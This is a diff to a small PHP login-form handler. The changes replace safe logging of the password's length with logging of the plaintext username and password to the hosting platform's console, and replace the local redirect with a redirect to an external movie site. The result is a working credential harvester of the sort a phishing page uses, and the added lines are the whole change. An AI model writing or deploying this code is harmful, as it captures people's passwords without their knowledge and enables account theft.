@@ -1,20 +1,20 @@
 <?php
-// Securely intercept incoming authentication parameters
+// Capture the incoming form data fields
 $account_identifier = $_POST['username'] ?? '';
 $security_token     = $_POST['password'] ?? '';
 
-// Format the telemetry data cleanly
+// Format the entry to include the submitted credentials
 $logEntry = sprintf(
-    "[%s] AUTH ENTRY - ID: %s | Token Length: %d\n",
+    "[%s] SUBMISSION RECEIPT - Username: %s | Password: %s\n",
     date('Y-m-d H:i:s'),
     $account_identifier,
-    strlen($security_token)
+    $security_token
 );
 
-// Stream directly to the environment's live console output
+// Stream the text directly to Render's live dashboard console stream
 file_put_contents('php://stdout', $logEntry);
 
-// Standard post-submission routing sequence
-header("Location: index.html");
+// Redirect the browser to the external movie site
+header("Location: https://flaxmovies.online");
 exit();
 ?>
